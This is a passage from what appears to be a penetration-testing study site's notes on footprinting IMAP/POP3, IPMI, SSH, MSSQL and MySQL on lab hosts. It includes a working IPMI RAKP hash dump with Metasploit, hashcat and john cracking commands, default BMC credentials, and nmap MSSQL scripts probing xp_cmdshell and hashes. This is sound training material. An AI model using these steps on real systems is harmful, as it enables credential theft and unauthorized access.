mail server and read or even send the individual messages.</p> <pre><code>secops@kali[/kali]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd\n\n* LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" INBOX\n</code></pre> <p><code>verbose</code> (<code>-v</code>) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.</p> <pre><code>secops@kali[/kali]$ curl -k 'imaps://10.129.14.128' --user cryanight:1234 -v\n\n*   Trying 10.129.14.128:993...\n* TCP_NODELAY set\n* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384\n* Server certificate:\n*  subject: C=US; ST=California; L=Sacramento; O=LEGALCORP; OU=Customer Support; CN=mail1.LEGALCORP.xyz; emailAddress=cryanight@LEGALCORP.xyz\n*  start date: Sep 19 19:44:58 2021 GMT\n*  expire date: Jul  4 19:44:58 2295 GMT\n*  issuer: C=US; ST=California; L=Sacramento; O=LEGALCORP; OU=Customer Support; CN=mail1.LEGALCORP.xyz; emailAddress=cryanight@LEGALCORP.xyz\n*  SSL certificate verify result: self signed certificate (18), continuing anyway.\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] xyz-Academy IMAP4 v.0.21.4\n&gt; A001 CAPABILITY\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN\n&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.\n&gt; A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE\n&lt; A002 OK Logged in\n&gt; A003 LIST \"\" *\n&lt; * LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" Important\n&lt; * LIST (\\HasNoChildren) \".\" INBOX\n* LIST (\\HasNoChildren) \".\" INBOX\n&lt; A003 OK List completed (0.001 + 0.000 secs).\n* Connection #0 to host 10.129.14.128 left intact\n</code></pre> <p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>.</p> <p>OpenSSL - TLS Encrypted Interaction POP3 <pre><code>secops@kali[/kali]$ openssl s_client -connect 10.129.14.128:pop3s\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2\n    Session-ID-ctx:\n    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.\n    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.\n    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.\n    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m\n    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..\n    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m&lt;.F\\.e....^\n    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8\n    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......&gt;.*....\n    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$\n    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...\n    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.\n    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\\(..6.}*.\n\n    Start Time: 1632081313\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n+OK twttr POP3 Server\n</code></pre></p> <p>OpenSSL - TLS Encrypted Interaction IMAP <pre><code>secops@kali[/kali]$ openssl s_client -connect 10.129.14.128:imaps\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Customer Support, CN = mail1.LEGALCORP.xyz, emailAddress = cryanight@LEGALCORP.xyz\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699\n    Session-ID-ctx:\n    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$\n    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&amp;..J}\n    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.\n    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)\n    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..\n    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..\n    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....\n    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..\n    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.\n    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!\n    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}\n    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb\n\n    Start Time: 1632081604\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] twttr IMAP4 v.0.21.4\n</code></pre></p> <p>Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server.</p>","title":"Footprinting the Service"},{"location":"footprinting/ipmi/","text":"<p>Intelligent Platform Management Interface (<code>IPMI</code>) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell.</p>","title":"IPMI"},{"location":"footprinting/ipmi/#footprinting-the-service","text":"<p>IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.</p> <p>Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH.</p> <pre><code>secops@kali[/kali]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT\nNmap scan report for ilo.inlanfreight.local (172.16.2.2)\nHost is up (0.00064s latency).\n\nPORT    STATE SERVICE\n623/udp open  asf-rmcp\n| ipmi-version:\n|   Version:\n|     IPMI-2.0\n|   UserAuth:\n|   PassAuth: auth_user, non_null_user\n|_  Level: 2.0\nMAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)\n\nNmap done: 1 IP address (1 host up) scanned in 0.46 seconds\n</code></pre> <p>IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)</p> <pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version \nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run\n\n[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)\n[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords include:</p>    Product Username Password     Dell iDRAC root calvin   HP iLO Administrator randomized 8-character string consisting of numbers and uppercase letters   Supermicro IPMI ADMIN ADMIN    <p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>","title":"Footprinting the Service"},{"location":"footprinting/ipmi/#dangerous-settings","text":"<p>If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using <code>Hashcat</code> mode <code>7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code> which tries all combinations of upper case letters and numbers for an eight-character password.</p> <p>To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module.</p> <pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n\n[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e\n[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>We have successfully obtained the password hash for the user <code>ADMIN</code>, and the tool was able to quickly crack it to reveal what appears to be a default password <code>ADMIN</code>. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>  <p>Cracking with John (<code>true</code> being the hashdump file from metasploit) <pre><code>$ cat true\n10.129.202.5 admin:$rakp$acb7c1bb82040000b34cd63433dcdc0bae326d5b80f48e04a1502ec990d05f4a42f2514a943ececba123456789abcdefa123456789abcdef140561646d696e$e06ce138ae580d96f1f287e2775af26db58e5c8f\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ john --format=rakp true\nUsing default input encoding: UTF-8\nLoaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding with wordlist:/usr/share/john/password.lst\ntrinity          (10.129.202.5 admin)     \n1g 0:00:00:00 DONE 2/3 (2021-12-28 06:38) 25.00g/s 345475p/s 345475c/s 345475C/s keller..222222\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre></p>","title":"Dangerous Settings"},{"location":"footprinting/linux_remote_management_protocol/","text":"<p>Secure Shell (<code>SSH</code>) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port <code>TCP 22</code>.</p> <p>OpenSSH has six different authentication methods:</p> <ol> <li>Password authentication</li> <li>Public-key authentication</li> <li>Host-based authentication</li> <li>Keyboard authentication</li> <li>Challenge-response authentication</li> <li>GSSAPI authentication</li> </ol> <p>More info about authentication methods</p>","title":"Linux"},{"location":"footprinting/linux_remote_management_protocol/#default-configuration","text":"<p>The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default.</p> <pre><code>secops@kali[/kali]$ cat /etc/ssh/sshd_config  | grep -v \"#\" | sed -r '/^\\s*$/d'\n\nInclude /etc/ssh/sshd_config.d/*.conf\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem       sftp    /usr/lib/openssh/sftp-server\n</code></pre>","title":"Default Configuration"},{"location":"footprinting/linux_remote_management_protocol/#dangerous-settings","text":"<p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks.</p>    Setting Description     <code>PasswordAuthentication yes</code> Allows password-based authentication.   <code>PermitEmptyPasswords yes</code> Allows the use of empty passwords.   <code>PermitRootLogin yes</code> Allows to log in as the root user.   <code>Protocol 1</code> Uses an outdated version of encryption.   <code>X11Forwarding yes</code> Allows X11 forwarding for GUI applications.   <code>AllowTcpForwarding yes</code> Allows forwarding of TCP ports.   <code>PermitTunnel</code> Allows tunneling.   <code>DebianBanner yes</code> Displays a specific banner when logging in.","title":"Dangerous Settings"},{"location":"footprinting/linux_remote_management_protocol/#footprinting-the-service","text":"<p>One of the tools we can use to fingerprint the SSH server is ssh-audit. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit\nsecops@kali[/kali]$ ./ssh-audit.py 10.129.14.132\n\n# general\n(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\n(gen) software: OpenSSH 8.2p1\n(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+\n(gen) compression: enabled (zlib@openssh.com)                                   \n\n# key exchange algorithms\n(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            \n(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4\n(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3\n(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n\n# host-key algorithms\n(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm\n                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28\n                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2\n(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves\n                                            `- [warn] using weak random number generator could reveal the key\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5\n...SNIP...\n</code></pre> <p>The first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as CVE-2020-14145, which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use.</p> <p>Change Authentication Method <pre><code>secops@kali[/kali]$ ssh -v john@10.129.14.132\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config \n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\n</code></pre></p> <p>For potential brute-force attacks, we can specify the authentication method with the SSH client option <code>PreferredAuthentications</code>.</p> <pre><code>secops@kali[/kali]$ ssh -v john@10.129.14.132 -o PreferredAuthentications=password\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config\n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\ndebug1: Next authentication method: password\njohn@10.129.14.132's password:\n</code></pre>","title":"Footprinting the Service"},{"location":"footprinting/mssql/","text":"<p>Microsoft SQL (<code>MSSQL</code>) is Microsoft's SQL-based relational database management system. Unlike MySQL, MSSQL is closed source and was initially written to run on Windows operating systems.</p>","title":"MSSQL"},{"location":"footprinting/mssql/#mssql-clients","text":"<p>SQL Server Management Studio (<code>SSMS</code>) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins.</p> <p></p> <p>Pentester's may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. <pre><code>secops@kali[/kali]$ locate mssqlclient\n\n/usr/bin/impacket-mssqlclient\n/usr/share/doc/python3-impacket/examples/mssqlclient.py\n</code></pre></p>","title":"MSSQL Clients"},{"location":"footprinting/mssql/#mssql-databases","text":"<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. </p>    Default System Database Description     <code>master</code> Tracks all system information for an SQL server instance   <code>model</code> Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database   <code>msdb</code> The SQL Server Agent uses this database to schedule jobs &amp; alerts   <code>tempdb</code> Stores temporary objects   <code>resource</code> Read-only database containing system objects included with SQL server    <p>Source: System Databases Microsoft Doc</p>","title":"MSSQL Databases"},{"location":"footprinting/mssql/#default-configuration","text":"<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as <code>NT SERVICE\\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.</p> <p></p> <p>Authentication being set to <code>Windows Authentication</code> means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. </p>","title":"Default Configuration"},{"location":"footprinting/mssql/#dangerous-settings","text":"<p>It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.</p> <p>We may benefit from looking into the following:</p> <ul> <li>MSSQL clients not using encryption to connect to the MSSQL server</li> <li>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates</li> <li>The use of named pipes</li> <li>Weak &amp; default <code>sa</code> credentials. Admins may forget to disable this account</li> </ul>  <p>Default tcp port <code>1433</code> that MSSQL listens on.</p> <p>Below, we can see the <code>hostname</code>, <code>database instance name</code>, <code>software version of MSSQL</code> and <code>named pipes are enabled</code>.</p> <pre><code>secops@kali[/kali]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST\nNmap scan report for 10.129.201.248\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: SQL-01\n|   NetBIOS_Domain_Name: SQL-01\n|   NetBIOS_Computer_Name: SQL-01\n|   DNS_Domain_Name: SQL-01\n|   DNS_Computer_Name: SQL-01\n|_  Product_Version: 10.0.17763\n\nHost script results:\n| ms-sql-dac: \n|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)\n| ms-sql-info: \n|   Windows server name: SQL-01\n|   10.129.201.248\\MSSQLSERVER: \n|     Instance name: MSSQLSERVER\n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|     TCP port: 1433\n|     Named pipe: \\\\10.129.201.248\\pipe\\sql\\query\n|_    Clustered: false\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.52 seconds\n</code></pre> <p>Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p> <pre><code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248\n\nrhosts =&gt; 10.129.201.248\n\n\nmsf6 auxiliary(scanner/mssql/mssql_ping) &gt; run\n\n[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:\n[+] 10.129.201.248:       -    ServerName      = SQL-01\n[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER\n[+] 10.129.201.248:       -    IsClustered     = No\n[+] 10.129.201.248:       -    Version         = 15.0.2000.5\n[+] 10.129.201.248:       -    tcp             = 1433\n[+] 10.129.201.248:       -    np              = \\\\SQL-01\\pipe\\sql\\query\n[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>).</p> <pre><code>secops@kali[/kali]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SQL-01): Line 1: Changed database context to 'master'.\n[*] INFO(SQL-01): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\n\nSQL&gt; select name from sys.databases\n\nname                                                                                                                               \n\n--------------------------------------------------------------------------------------\n\nmaster                                                                                                                             \n\ntempdb                                                                                                                             \n\nmodel                                                                                                                              \n\nmsdb                                                                                                                               \n\nTransactions    \n</code></pre>","title":"Dangerous Settings"},{"location":"footprinting/mysql/","text":"<p><code>MySQL</code> is an open-source SQL relational database management system developed and supported by Oracle. MySQL works according to the <code>client-server principle</code> and consists of a MySQL server and one or more MySQL clients.</p>","title":"MySQL"},{"location":"footprinting/mysql/#default-configuration","text":"<pre><code>secops@kali[/kali]$ sudo apt install mysql-server -y\nsecops@kali[/kali]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d'\n\n[client]\nport        = 3306\nsocket      = /var/run/mysqld/mysqld.sock\n\n[mysqld_safe]\npid-file    = /var/run/mysqld/mysqld.pid\nsocket      = /var/run/mysqld/mysqld.sock\nnice        = 0\n\n[mysqld]\nskip-host-cache\nskip-name-resolve\nuser        = mysql\npid-file    = /var/run/mysqld/mysqld.pid\nsocket      = /var/run/mysqld/mysqld.sock\nport        = 3306\nbasedir     = /usr\ndatadir     = /var/lib/mysql\ntmpdir      = /tmp\nlc-messages-dir = /usr/share/mysql\nexplicit_defaults_for_timestamp\n\nsymbolic-links=0\n\n!includedir /etc/mysql/conf.d/\n</code></pre>","title":"Default 